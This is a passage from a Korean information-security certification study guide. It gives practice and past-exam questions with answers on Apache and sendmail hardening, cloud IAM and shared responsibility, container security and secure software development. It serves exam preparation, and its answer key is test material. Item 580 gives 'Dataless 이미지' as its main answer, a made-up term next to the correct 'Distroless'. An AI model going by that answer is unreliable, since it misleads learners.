<strong>기대 효과</strong>: 디컴파일을 통해 소스코드를 복원하더라도 클래스명이나 변수명 등이 암호화/축약되어 있어 공격자가 로직을 분석하고 취약점을 파악하는 데 걸리는 시간과 비용을 크게 증가시킬 수 있다.<br>
<strong>한계점</strong>: 난독화는 코드를 읽기 어렵게 만들 뿐이지 실행 파일 자체가 암호화되는 것은 아니며 취약점 자체를 제거하는 것이 아니므로, 시간과 노력을 들인 구조 분석이나 런타임 메모리 분석 등을 통해 결국 역공학(Reverse Engineering)이 가능하다는 한계가 있다.
</blockquote>
</details>

<details>
<summary>[565] (단답형) 안드로이드 앱의 필수 권한 선언 및 앱 구성 정보를 담고 있는 설정 파일의 명칭을 작성하시오.</summary>
<blockquote>
<code>AndroidManifest.xml</code>
</blockquote>
</details>

## [9] 웹 서버 취약점

### Directory Listing 취약점

### Web Service Method 설정 취약점

### 관리자 페이지 노출 취약점

### 위치 공개 취약점

### 검색엔진 정보 노출 취약점

<details>
<summary>[566] (단답형) 웹 사이트의 루트 디렉터리에 위치하며, 검색 엔진의 웹 크롤러(로봇)가 접근해도 되는 페이지와 접근해서는 안 되는 페이지(관리자 페이지 등)를 명시하여 검색 노출을 제어하는 표준 파일의 명칭을 쓰시오.</summary>
<blockquote>
<code>robots.txt</code>
</blockquote>
</details>

### 기타 웹서버 보안 대책(아파치 기준)

<details>
<summary>[기출 19회 7번 문제] (단답형) 아파치 웹서버의 로그 중 정상 접속을 기록하는 로그(A), 오류 상황을 기록하는 로그(B), 그리고 로그 경로를 설정하는 메인 설정 파일(C)을 기술하시오.</summary>
<blockquote>
<strong>정답:</strong> (A) <strong>access_log</strong> (또는 Access 로그), (B) <strong>error_log</strong> (또는 Error 로그), (C) <strong>httpd.conf</strong>
</blockquote>
</details>

<details>
<summary>[기출 20회 8번 문제] (단답형) 아파치 설정에서 디렉터리 인덱싱 취약점을 해결하기 위해 <code>Options</code> 지시자에서 삭제해야 할 항목은 무엇인가?</summary>
<blockquote>
<strong>정답:</strong> <strong>Indexes</strong> (또는 <code>-Indexes</code>로 설정)
</blockquote>
</details>

<details>
<summary>[기출 21회 10번 문제] (단답형) 아파치(Apache)의 <code>httpd.conf</code> 파일에서 디렉터리에 업로드 가능한 최대 파일 사이즈를 제한하는 지시어(명령어)는?</summary>
<blockquote>
<strong>정답:</strong> <strong>LimitRequestBody</strong>
</blockquote>
</details>


### 웹 로그 분석

### Security Server 구축

## [10] 이메일(E-mail) 보안

### 이메일 시스템 구조

### SMTP 메일 형식

### 메일서버(sendmail) 보안 설정

<details>
<summary>[기출 20회 14번 문제] (실무형) Sendmail 릴레이 제한 설정 파일(1), 스팸 차단 옵션(2), DB 생성 명령어(3), DB 파일명(4)을 기술하시오.</summary>
<blockquote>
<strong>정답:</strong> (1) <strong>sendmail.cf</strong>, (2) <strong>REJECT 또는 DISCARD</strong>, (3) <strong>makemap</strong>, (4) <strong>access.db</strong>
</blockquote>
</details>

<details>
<summary>[기출 21회 1번 문제] (단답형) Sendmail에서 스팸메일 릴레이 제한 설정 후 access DB를 생성하기 위한 명령어를 완성하시오.<br>
<code># (A) (B) /etc/mail/access.db < /etc/mail/access</code></summary>
<blockquote>
<strong>정답:</strong> (A) <strong>makemap</strong>, (B) <strong>hash</strong>
</blockquote>
</details>

### 이메일 인증 기술(스팸 메일 방지 기술)

<details>
<summary>[567] (단답형) 최근 랜섬웨어 메일이나 악성 문서 파일 공격을 방어하기 위해 도입되는 기술로, 유입되는 파일에서 문서 구조만 추출하고 스크립트나 매크로 등 위협이 될 수 있는 요소들을 제거한 뒤 안전한 형태(PDF 등)로 재조합하여 내부로 반입하는 기술의 영문 약어를 쓰시오.</summary>
<blockquote>
<code>CDR</code> (Content Disarm & Reconstruction)
</blockquote>
</details>

## [11] 데이터베이스 보안

### 데이터베이스 보안 위협과 통제

### DBMS 보안 통제

### 데이터베이스 암호화 기술

### 데이터베이스(MySQL) 취약점 점검

## [12] 클라우드 컴퓨팅 보안

### 클라우드 컴퓨팅 개요 및 특징

### 클라우드 컴퓨팅 분류

### 클라우드 기반 보안 서비스: SecaaS

### 클라우드 보안 모델 및 설정 관리

<details>
<summary>[568] (단답형) 클라우드 서비스 제공자(CSP)는 물리적 인프라와 가상화 계층을 보호하고, 고객은 데이터, 애플리케이션, OS 설정을 보호한다는 개념으로 클라우드 보안의 핵심 원칙인 이 모델의 명칭을 쓰시오.</summary>
<blockquote>
공유 책임 모델 (Shared Responsibility Model)
</blockquote>
</details>

<details>
<summary>[569] (서술형) IaaS(Infrastructure as a Service) 환경에서 운영체제(OS) 패치 및 방화벽 설정(Security Group)의 책임 주체는 누구인지 '공유 책임 모델' 관점에서 서술하시오.</summary>
<blockquote>
<strong>책임 주체</strong>: 고객(사용자)<br>
<strong>이유</strong>: IaaS에서 CSP는 네트워크, 스토리지 등 하드웨어 인프라만 관리하며, 그 위에 올라가는 OS 선택부터 패치 적용, 네트워크 접근 제어(ACL) 설정은 전적으로 고객의 관리 영역이기 때문이다.
</blockquote>
</details>

<details>
<summary>[570] (단답형) 클라우드 리소스에 대한 접근 권한을 관리하는 서비스로, 사용자/그룹/역할(Role)을 정의하여 '최소 권한의 원칙'을 적용하는 이 서비스의 영문 약어를 쓰시오.</summary>
<blockquote>
<code>IAM</code> (Identity and Access Management)
</blockquote>
</details>

<details>
<summary>[571] (서술형) 클라우드 환경에서 '사용자'에게 직접 권한을 부여하는 것보다 '역할(Role)'을 사용하는 것이 보안상 유리한 이유를 기술하시오.</summary>
<blockquote>
역할(Role)은 필요한 시점에 일시적으로 권한을 위임받아 사용하는 방식이다. 고정된 자격 증명(Access Key)을 사용하지 않고 <strong>임시 자격 증명</strong>을 발급받아 수행하므로, 키 유출 시의 피해를 최소화할 수 있으며 권한 관리가 유연하다.
</blockquote>
</details>

<details>
<summary>[기출 12회 6번 문제] (단답형) 클라우드 서비스(Cloud Service)의 3가지 서비스 모델에 대하여 설명하시오.
1) 서버, 가상화, 네트워크 등 IT 인프라 자원을 서비스 형태로 제공하는 모델: <strong>( A )</strong><br>
2) 개발자가 애플리케이션을 개발, 실행, 관리할 수 있는 플랫폼 환경을 제공하는 모델: <strong>( B )</strong><br>
3) 클라우드 인프라 위에서 구동되는 소프트웨어를 웹을 통해 완전한 서비스 형태로 제공하는 모델: <strong>( C )</strong>
</summary>
<blockquote>
<strong>정답:</strong><br>
(A) <strong>IaaS (Infrastructure as a Service)</strong><br>
(B) <strong>PaaS (Platform as a Service)</strong><br>
(C) <strong>SaaS (Software as a Service)</strong>
</blockquote>
</details>

<details>
<summary>[572] (단답형) 클라우드 스토리지(예: AWS S3) 설정 오류로 인해 발생하는 가장 흔한 보안 사고 유형으로, 인증되지 않은 외부인이 내부 파일을 열람하거나 다운로드할 수 있게 되는 상태를 무엇이라 하는가?</summary>
<blockquote>
퍼블릭 노출 (또는 Public Access 허용)
</blockquote>
</details>

<details>
<summary>[573] (서술형) 클라우드 환경의 보안 위협 중 하나인 '그림자 IT (Shadow IT)'의 개념과 클라우드 가시성 확보의 중요성을 서술하시오.</summary>
<blockquote>
기업의 공식 보안 정책이나 중앙 관리를 벗어나 현업 부서에서 임의로 클라우드 서비스(SaaS, IaaS 등)를 구독하거나 사용하는 것을 의미한다. 이는 보안 담당자가 자산의 위치와 취약점을 파악할 수 없게 만들어 데이터 유출의 사각지대를 형성하므로, 클라우드 자산에 대한 통합 가시성 확보가 필수적이다.
</blockquote>
</details>

<details>
<summary>[574] (단답형) 클라우드 서비스를 안전하게 이용하기 위해 서비스 설정 상태를 지속적으로 모니터링하고, 규정 준수 여부 및 위험 요소를 자동으로 탐지하여 수정하는 보안 솔루션의 영문 약어를 쓰시오.</summary>
<blockquote>
<code>CSPM</code> (Cloud Security Posture Management)
</blockquote>
</details>

<details>
<summary>[575] (서술형) 클라우드 환경에서 'SecGroup(Security Group)'과 'NACL(Network ACL)'의 주요 차이점을 상태(State) 유지 관점에서 서술하시오.</summary>
<blockquote>
<strong>Security Group</strong>: <strong>상태 기반(Stateful)</strong> 검사를 수행하므로 인바운드 허용 시 아웃바운드는 자동으로 허용된다.<br>
<strong>NACL</strong>: <strong>상태 비저장(Stateless)</strong> 검사를 수행하므로 인바운드와 아웃바운드 규칙을 각각 명시적으로 설정해야 한다.
</blockquote>
</details>

<details>
<summary>[576] (단답형) 클라우드 기반 보안 서비스(SecaaS) 중, 지점과 본사 및 클라우드 자원 간의 안전한 연결과 보안 정책(CASB, SWG, FWaaS 등)을 통합 제공하는 최신 아키텍처의 영문 약어를 쓰시오.</summary>
<blockquote>
<code>SASE</code> (Secure Access Service Edge)
</blockquote>
</details>

<details>
<summary>[577] (작업형) 다음 빈칸 (A), (B)를 클라우드 보안 설정 관점에서 채우시오.<br>
<div style="border: 1px solid #777; padding: 10px; margin-top: 10px; border-radius: 5px;">
- 시나리오: 외부 개발자에게 특정 S3 버킷의 정적 파일만 읽도록 허용하려 한다.<br>
- 조치 1: <code>( A )</code> 정책을 통해 해당 개발자의 ID에 필요한 리소스 접근 권한을 최소화하여 부여한다.<br>
- 조치 2: 버킷 자체에도 <code>( B )</code> 정책을 설정하여 특정 IP 대역에서만 접근 가능하도록 이중 제한을 둔다.
</div>
</summary>
<blockquote>
(A) IAM (Identity) 정책<br>
(B) Bucket (버킷) 정책
</blockquote>
</details>

### 컨테이너 및 오케스트레이션 보안 (Docker / Kubernetes)

<details>
<summary>[578] (단답형) 애플리케이션과 실행에 필요한 모든 라이브러리를 하나로 묶어 격리된 환경에서 구동하는 기술로, 최근 클라우드 네이티브 환경의 핵심인 이 기술은?</summary>
<blockquote>
컨테이너 (Container) (또는 Docker)
</blockquote>
</details>

<details>
<summary>[579] (서술형) 가상 머신(VM)과 비교하여 컨테이너가 보안상 가지는 잠재적 위험 요소 중 '커널 공유' 문제를 중심으로 서술하시오.</summary>
<blockquote>
가상 머신은 각 게스트 OS가 독립적인 커널을 가지지만, 컨테이너는 호스트 OS의 <strong>커널을 공유</strong>한다. 따라서 특정 컨테이너에서 커널 취약점을 이용한 <strong>탈출 공격(Container Escape)</strong>이 발생할 경우 호스트 시스템 전체와 다른 컨테이너까지 위협받을 수 있다는 취약점이 있다.
</blockquote>
</details>

<details>
<summary>[580] (단답형) 컨테이너 이미지 생성 시, 불필요한 패키지나 쉘을 포함하지 않고 오직 애플리케이션 실행 파일만 포함하여 공격 표면을 최소화한 이미지를 무엇이라 하는가?</summary>
<blockquote>
Dataless 이미지 (또는 Distroless 이미지)
</blockquote>
</details>

<details>
<summary>[581] (서술형) Dockerfile 작성 시 <code>USER root</code> 설정을 지양하고 일반 사용자 계정을 사용해야 하는 보안적 이유를 기술하시오.</summary>
<blockquote>
컨테이너 내부에서 root 권한으로 프로세스가 구동되면, 만약 컨테이너가 해킹당했을 때 공격자가 호스트 시스템의 root 권한까지 획득할 수 있는 Risk가 커지기 때문이다. 최소 권한 원칙에 따라 서비스를 구동해야 한다.
</blockquote>
</details>

<details>
<summary>[582] (단답형) 컨테이너의 라이프사이클을 관리하고 배포하는 오케스트레이션 도구(Kubernetes 등)에서, 컨테이너가 실행될 때 적용되는 보안 설정(권한, 파일시스템 접근 등)을 정의하는 객체의 명칭을 쓰시오.</summary>
<blockquote>
보안 컨텍스트 (Security Context)
</blockquote>
</details>

<details>
<summary>[583] (서술형) 쿠버네티스(Kubernetes) 환경에서 '네트워크 정책(NetworkPolicy)'의 역할을 전통적인 방화벽과 비교하여 설명하시오.</summary>
<blockquote>
전통적 방화벽이 단말 간의 통신을 제어한다면, 네트워크 정책은 **파드(Pod) 간의 통신**을 L3/L4 수준에서 제어한다. 기본적으로 모든 파드는 서로 통신 가능하므로, 명시적으로 허용된 파드들끼리만 통신하도록 제한하여 보안성을 높인다.
</blockquote>
</details>

<details>
<summary>[584] (단답형) 컨테이너 이미지 내부에 포함된 오픈소스 라이브러리나 OS 패키지의 알려진 취약점(CVE)을 스캐닝하여 안전성을 점검하는 도구 중 대표적인 오픈소스 도구의 명칭은? (힌트: T로 시작)</summary>
<blockquote>
<code>Trivy</code> (또는 Clair)
</blockquote>
</details>

<details>
<summary>[585] (서술형) 소프트웨어 공급망 보안을 위해 컨테이너 이미지에 **디지털 서명**을 하고 수신 측에서 이를 검증해야 하는 이유를 기술하시오.</summary>
<blockquote>
이미지 레지스트리(저장소)에 올라간 이미지가 전송 과정에서 변조되었거나, 공격자가 악성 코드를 심어 제작한 신뢰할 수 없는 이미지가 배포되는 것을 방지하여 <strong>이미지 무결성</strong>을 보장하기 위함이다.
</blockquote>
</details>

<details>
<summary>[586] (단답형) 컨테이너 내부의 프로세스가 호스트의 중요 파일을 수정하거나 민감한 시스템 콜을 호출하는 것을 차단하기 위해 리눅스 커널 수준에서 적용하는 보안 모듈(LSM) 2가지를 쓰시오.</summary>
<blockquote>
AppArmor, SELinux
</blockquote>
</details>

<details>
<summary>[587] (작업형) 다음 빈칸 (A), (B)를 기술하시오.<br>
<div style="border: 1px solid #777; padding: 10px; margin-top: 10px; border-radius: 5px;">
- 보완 조치: 실행 중인 컨테이너가 해킹당하더라도 내부 설정 파일이 변조되는 것을 막기 위해 <code>( A )</code> 옵션을 사용하여 컨테이너를 구동한다.<br>
- 가시성 확보: 쿠버네티스 기동 시 모든 API 요청을 기록하는 <code>( B )</code> 로그를 활성화하여 비정상적인 접근 시도를 사후 추적한다.
</div>
</summary>
<blockquote>
(A) Read-only Root Filesystem (<code>--read-only</code>)<br>
(B) 감사 (Audit)
</blockquote>
</details>


### 소프트웨어 개발 보안

<details>
<summary>[기출 22회 10번 문제] (단답형) SW 개발과정에서 DBMS 조회를 위한 질의문 생성 시 사용되는 고려사항이다. ( )에 들어갈 용어를 기술하시오.<br>
1. 애플리케이션에서 DB연결을 통해 데이터를 처리하는 경우 (A)이 설정된 계정을 사용해야 한다.<br>
2. 외부 입력값이 삽입되는 SQL 쿼리문을 (B)으로 생성해서 실행하지 않도록 해야 한다.<br>
3. 외부 입력값을 이용해 동적으로 SQL 쿼리문을 생성해야 하는 경우, (C)에 대한 검증을 수행한 뒤 사용해야 한다.</summary>
<blockquote>
<strong>정답:</strong> (A) <strong>최소 권한</strong>, (B) <strong>동적 (Dynamic)</strong>, (C) <strong>입력값</strong>
</blockquote>
</details>


<details>
<summary>[588] (기출 25회 13번 문제) (서술형) 행정안전부의 '소프트웨어 개발보안 가이드'에 따르면, 개발 과정 각 단계별 보안 활동을 정의하고 있다. 그중 분석 단계의 보안 활동(보안 요구사항 분석) 결과로 도출되는 산출물 3가지를 기술하시오.</summary>
<blockquote>
1. <strong>보안 요구사항 명세서</strong> (Security Requirements List)<br>
2. <strong>보안 위협 모델링 결과서</strong> (또는 보안 위험 분석 보고서)<br>
3. <strong>데이터 분류 및 기밀 등급 분류표</strong>
</blockquote>
</details>

<details>
<summary>[589] (단답형) 행정안전부 '소프트웨어 개발보안 가이드'에서 정의한 7대 보안 약어(Security Weaknesses) 중, 소스코드의 로직이나 설정이 잘못되어 발생하는 보안 약점이 포함된 범주명을 쓰시오.</summary>
<blockquote>
<strong>정답:</strong> <strong>코드 오류</strong>
</blockquote>
</details>

<details>
<summary>[590] (서술형) 소프트웨어 개발보안 진단 도구 중 **정적 분석(Static Analysis)**과 **동적 분석(Dynamic Analysis)**의 차이점을 분석 시점과 대상 측면에서 설명하시오.</summary>
<blockquote>
<strong>정적 분석</strong>: 프로그램을 실행하지 않고 소스코드 자체를 분석하여 설계나 구현 단계의 결함을 찾아내는 방식이다.<br>
<strong>동적 분석</strong>: 프로그램을 실제로 실행한 상태에서 입력값에 대한 출력 결과나 메모리 상태 등을 모니터링하여 런타임에 발생하는 취약점을 찾아내는 방식이다.
</blockquote>
</details>

<details>
<summary>[591] (단답형) 보안 강화를 위해 기존의 SDLC(Software Development Life Cycle)에 보안 활동을 추가한 모델로, 마이크로소프트(MS)에서 제안하여 널리 사용되는 보안 개발 방법론의 명칭은?</summary>
<blockquote>
<strong>정답:</strong> <strong>MS SDL</strong> (Security Development Lifecycle)
</blockquote>
</details>

<details>
<summary>[592] (서술형) 소프트웨어 개발보안 방법론 중 **CLASP**의 특징을 5가지 관점(View)을 중심으로 간단히 설명하시오.</summary>
<blockquote>
<strong>특징</strong>: SDLC 초기 단계에서의 보안 강화를 목적으로 하며, 총 5가지 관점(개념, 역할, 활동, 자원, 결함)에 따라 체계적인 보안 활동 세트를 제공한다.
</blockquote>
</details>

<details>
<summary>[593] (단답형) 소프트웨어 개발보안 방법론 중 하나로, 실무적으로 검증된 보안 강화 활동을 7가지 핵심 요소(코드 검토, 외부 인터페이스 분석 등)로 정의한 방법론의 명칭은?</summary>
<blockquote>
<strong>정답:</strong> <strong>Seven Touchpoints</strong>
</blockquote>
</details>

<details>
<summary>[기출 20회 7번 문제] (단답형) 분산 원장 기술인 (B)를 거래 기록 저장소로 이용하며, 사토시 나카모토가 개발한 가상화폐 (A)와 Hash 연산을 통해 거래를 증명하고 이에 대한 대가를 받는 행위 (C)를 기술하시오.</summary>
<blockquote>
<strong>정답:</strong> (A) <strong>비트코인 (Bitcoin)</strong>, (B) <strong>블록체인 (Blockchain)</strong>, (C) <strong>채굴 (Mining)</strong>
</blockquote>
</details>
